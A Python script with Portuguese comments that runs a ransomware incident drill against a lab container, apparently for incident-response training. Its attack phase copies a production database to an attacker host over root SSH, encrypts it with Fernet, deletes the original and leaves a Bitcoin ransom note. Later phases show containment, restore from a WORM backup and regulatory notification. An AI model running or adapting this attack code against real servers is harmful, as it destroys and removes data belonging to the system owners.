"""
CENARIO 1 - Ataque de Ransomware com criptografia Fernet (AES)
"""

import subprocess, time, datetime, os
from cryptography.fernet import Fernet

# ── Cores ────────────────────────────────────────────────────
class C:
    R ="\033[0m"
    V ="\033[92m"
    A ="\033[93m"
    E ="\033[91m"
    CI="\033[96m"
    B ="\033[1m"

def log(msg, cor=C.R, pre=""):
    h = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{cor}{pre}[{h}] {msg}{C.R}")
    with open("/logs/cenario1.log", "a") as f:
        f.write(f"[{h}] {msg}\n")

def sep(titulo="", cor=C.CI):
    linha = "=" * 58
    print(f"\n{cor}{C.B}{linha}{C.R}")
    if titulo:
        print(f"{cor}{C.B}  {titulo}{C.R}")
        print(f"{cor}{C.B}{linha}{C.R}")
    print()

def aguardar(msg="Pressione ENTER para continuar..."):
    print(f"\n{C.A}{C.B}  >>> {msg}{C.R}\n")
    input()

def exec_ssh(host, cmd):
    """Uma conexao SSH, um ou varios comandos encadeados com &&."""
    r = subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no",
         "-p", "22", f"root@{host}", cmd],
        capture_output=True, text=True
    )
    return r.stdout.strip(), r.returncode

def exec_scp_baixar(host, origem, destino):
    """Copia arquivo do container para o atacante."""
    r = subprocess.run(
        ["scp", "-o", "StrictHostKeyChecking=no",
         f"root@{host}:{origem}", destino],
        capture_output=True, text=True
    )
    return r.returncode

def exec_scp_enviar(host, origem, destino):
    """Copia arquivo do atacante para o container."""
    r = subprocess.run(
        ["scp", "-o", "StrictHostKeyChecking=no",
         origem, f"root@{host}:{destino}"],
        capture_output=True, text=True
    )
    return r.returncode

os.makedirs("/logs", exist_ok=True)
open("/logs/cenario1.log", "w").close()

exec_ssh("srv-producao",
    "mkdir -p /app/logs && > /app/logs/incidente.log")

# ════════════════════════════════════════════════════════════
sep("CENARIO 1 - ATAQUE DE RANSOMWARE", C.CI)
log("CLT Distribuidora S.A. - Simulacao de Incidente P1")
log("Stack: Alpine Linux 3.19 + Fernet (AES-128) + Docker")
log(f"Atacante: srv-atacante", C.CI)
log(f"Alvo:     srv-producao", C.E, ">>> ")
print(f"\n  {C.A}Abra o PuTTY da producao e rode:{C.R}")
print(f"  {C.B}tail -f /app/logs/incidente.log{C.R}\n")
aguardar("Producao monitorando? ENTER para iniciar...")

# ════════════════════════════════════════════════════════════
# FASE 1 - 1 conexao SSH (leitura + logs)
# ════════════════════════════════════════════════════════════
sep("FASE 1 - SITUACAO NORMAL")
log("Verificando estado do servidor alvo...", C.V)
time.sleep(1)

CMD_FASE1 = (
    "echo '[OK] Sistema CRM operando normalmente' >> /app/logs/incidente.log && "
    "echo '[OK] Equipe de vendas registrando pedidos' >> /app/logs/incidente.log && "
    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;' && "
    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;' && "
    "ls -lh /app/banco/clt.db"
)
out, _ = exec_ssh("srv-producao", CMD_FASE1)
linhas = out.split("\n")

clientes = linhas[0] if len(linhas) > 0 else "?"
pedidos  = linhas[1] if len(linhas) > 1 else "?"
banco    = linhas[2] if len(linhas) > 2 else "?"

log(f"Clientes em srv-producao: {clientes}", C.V)
log(f"Pedidos ativos: {pedidos}", C.V)
log(f"Arquivo do banco: {banco}", C.V)

aguardar("Sistema normal confirmado. ENTER para simular o ataque...")

# ════════════════════════════════════════════════════════════
# FASE 2 - 1 conexao SCP (baixar) + 1 conexao SSH (comprometer) + 1 SCP (enviar)
# ════════════════════════════════════════════════════════════
sep("FASE 2 - ATAQUE DE RANSOMWARE", C.E)
log("Iniciando conexao nao autorizada com srv-producao...", C.A)
time.sleep(1)
log("Conexao estabelecida! Mapeando sistema de arquivos...", C.E, "!!! ")
time.sleep(0.8)

log("Gerando chave de criptografia Fernet (AES-128)...", C.A)
CHAVE  = Fernet.generate_key()
fernet = Fernet(CHAVE)
log(f"Chave gerada: {CHAVE.decode()[:40]}...", C.E)
log("Chave retida pelo atacante - sem ela nao ha recuperacao!", C.E, "!!! ")
time.sleep(0.5)
with open("/logs/chave_ransomware.key", "wb") as f:
    f.write(CHAVE)

aguardar("ENTER para criptografar o banco de dados...")

# SCP 1: baixar o banco (1 senha)
log("Baixando banco de dados de srv-producao...", C.A)
exec_scp_baixar("srv-producao", "/app/banco/clt.db", "/tmp/clt.db")

if os.path.exists("/tmp/clt.db"):
    log("Banco baixado com sucesso!", C.E, "!!! ")
    with open("/tmp/clt.db", "rb") as f:
        dados = f.read()
    dados_criptografados = fernet.encrypt(dados)
    log(f"Criptografando {len(dados)} bytes com AES-128...", C.A)
    time.sleep(0.8)
    with open("/tmp/clt.db.locked", "wb") as f:
        f.write(dados_criptografados)
    log(f"Arquivo criptografado: {len(dados_criptografados)} bytes", C.E)

    # SCP 2: enviar o banco criptografado (1 senha)
    exec_scp_enviar("srv-producao", "/tmp/clt.db.locked", "/app/banco/clt.db.locked")

    # SSH: remover banco original, criar nota, registrar logs — tudo em 1 conexao (1 senha)
    CMD_COMPROMETER = (
        "rm -f /app/banco/clt.db && "
        "echo 'RANSOMWARE: Pague 10 BTC - hacker@dark.net' > /app/banco/LEIA-ME.txt && "
        "echo '[CRIT] transferencia de dados detectada!' >> /app/logs/incidente.log && "
        "echo '[CRIT] /app/banco/clt.db REMOVIDO!' >> /app/logs/incidente.log && "
        "echo '[CRIT] CRM INDISPONIVEL - banco inacessivel!' >> /app/logs/incidente.log && "
        "ls /app/banco/"
    )
    out, _ = exec_ssh("srv-producao", CMD_COMPROMETER)
    log(f"Estado do banco em srv-producao:\n    {out}", C.E)

log("SISTEMA COMPROMETIDO - CRM INDISPONIVEL", C.E, "!!! ")
log("Mensagem: Pague 10 BTC para recuperar seus dados", C.E, "!!! ")
aguardar("ENTER para acionar o CSIRT...")

# ════════════════════════════════════════════════════════════
# FASE 3 - 1 conexao SSH (logs do CSIRT)
# ════════════════════════════════════════════════════════════
sep("FASE 3 - ACIONAMENTO DO CSIRT", C.A)
log("Coordenador de Incidentes acionado", C.A)
log("Canal de crise: #incidente-p1-ransomware", C.A)
log("DPO notificado - possivel exposicao de dados pessoais", C.A)
ts = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
log(f"Timestamp: {ts}", C.A)

CMD_CSIRT = (
    f"echo '[CSIRT] Incidente P1 confirmado' >> /app/logs/incidente.log && "
    f"echo '[CSIRT] Canal de crise: #incidente-p1-ransomware' >> /app/logs/incidente.log && "
    f"echo '[CSIRT] Timestamp oficial: {ts}' >> /app/logs/incidente.log"
)
exec_ssh("srv-producao", CMD_CSIRT)
aguardar("ENTER para iniciar a contencao...")

# ════════════════════════════════════════════════════════════
# FASE 4 - 1 conexao SSH (isolar + log)
# ════════════════════════════════════════════════════════════
sep("FASE 4 - CONTENCAO", C.A)
log("Isolando srv-producao da rede via iptables...", C.A)

CMD_CONTENCAO = (
    "iptables -I INPUT -j DROP && "
    "iptables -I OUTPUT -j DROP && "
    "echo '[CONT] Servidor ISOLADO - iptables DROP aplicado' >> /app/logs/incidente.log && "
    "echo '[CONT] Memoria preservada para forense' >> /app/logs/incidente.log"
)
exec_ssh("srv-producao", CMD_CONTENCAO)
time.sleep(0.5)
log("srv-producao ISOLADO da rede", C.V)
log("Integracoes com ERPs suspensas", C.A)
log("Servidor NAO desligado - memoria preservada para forense", C.CI)
aguardar("ENTER para restaurar via backup WORM...")

# ════════════════════════════════════════════════════════════
# FASE 5 - 1 conexao SSH (liberar + verificar + restore + log)
# ════════════════════════════════════════════════════════════
sep("FASE 5 - RECUPERACAO VIA BACKUP WORM", C.V)
log("Verificando backup WORM e executando restore...", C.A)
time.sleep(1)

CMD_RESTORE = (
    "iptables -F && "
    "echo '[RESTO] Rede restaurada para operacao de restore' >> /app/logs/incidente.log && "
    "ls -lh /app/backup/ && "
    "md5sum /app/backup/clt_backup.db && "
    "rm -f /app/banco/clt.db.locked /app/banco/LEIA-ME.txt && "
    "cp /app/backup/clt_backup.db /app/banco/clt.db && "
    "echo '[RESTO] Backup WORM restaurado com sucesso!' >> /app/logs/incidente.log"
)
out, code = exec_ssh("srv-producao", CMD_RESTORE)
linhas = out.split("\n")

backup_info = next((l for l in linhas if "clt_backup.db" in l and "total" not in l), "")
md5_info    = next((l for l in linhas if "clt_backup" in l and "/" in l), "")

if backup_info:
    log(f"Backup WORM encontrado: {backup_info}", C.V)
if md5_info:
    log(f"Hash MD5 verificado: {md5_info}", C.V)

log("Arquivos criptografados removidos", C.A)
log("Restore concluido!", C.V)
aguardar("ENTER para validar os dados recuperados...")

# ════════════════════════════════════════════════════════════
# FASE 6 - 1 conexao SSH (validar 3 tabelas + log)
# ════════════════════════════════════════════════════════════
sep("FASE 6 - VALIDACAO POS-RESTORE", C.V)
log("Validando integridade dos dados...", C.A)
time.sleep(1)

CMD_VALIDAR = (
    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;' && "
    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;' && "
    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM catalogo;' && "
    "echo '[VALID] Validacao concluida' >> /app/logs/incidente.log && "
    "echo '[OK] Banco 100% integro - patch aplicado' >> /app/logs/incidente.log"
)
out, _ = exec_ssh("srv-producao", CMD_VALIDAR)
contagens = [l for l in out.split("\n") if l.strip().isdigit()]
tabelas   = ["clientes", "pedidos", "catalogo"]
todos_ok  = True

for i, tabela in enumerate(tabelas):
    qtd = contagens[i] if i < len(contagens) else "?"
    ok  = qtd == "5"
    st  = f"{C.V}[OK]{C.R}" if ok else f"{C.E}[FALHA]{C.R}"
    print(f"    {st} Tabela {tabela}: {qtd} registro(s)")
    if not ok:
        todos_ok = False
    time.sleep(0.3)

if todos_ok:
    log("Todos os dados validados - banco 100% integro!", C.V)
log("Patch de seguranca aplicado", C.V)
aguardar("ENTER para encerrar o incidente...")

# ════════════════════════════════════════════════════════════
# FASE 7 - 1 conexao SSH (log final)
# ════════════════════════════════════════════════════════════
sep("FASE 7 - ENCERRAMENTO", C.CI)

CMD_ENCERRAR = (
    "echo '[OK] CRM liberado para os usuarios' >> /app/logs/incidente.log && "
    "echo '[LGPD] Notificacao ANPD preparada - prazo 72h iniciado' >> /app/logs/incidente.log"
)
exec_ssh("srv-producao", CMD_ENCERRAR)

log("Notificacao preparada para ANPD - prazo 72h (LGPD Art. 48)", C.A)
log("Equipe comercial informada - CRM disponivel", C.V)
log("Sistema liberado para os usuarios", C.V)

sep("RESULTADO DO CENARIO 1", C.V)
log("INCIDENTE ENCERRADO COM SUCESSO", C.V, ">>> ")
log("Downtime: dentro do RTO de 4h definido na BIA", C.V)
log("Dados recuperados: 100% via backup WORM", C.V)
log("Criptografia real: Fernet AES-128", C.V)
log("Chave do atacante salva em: /logs/chave_ransomware.key", C.CI)
log("Log do atacante:  /logs/cenario1.log", C.CI)
log("Log da producao:  /app/logs/incidente.log", C.CI)
print()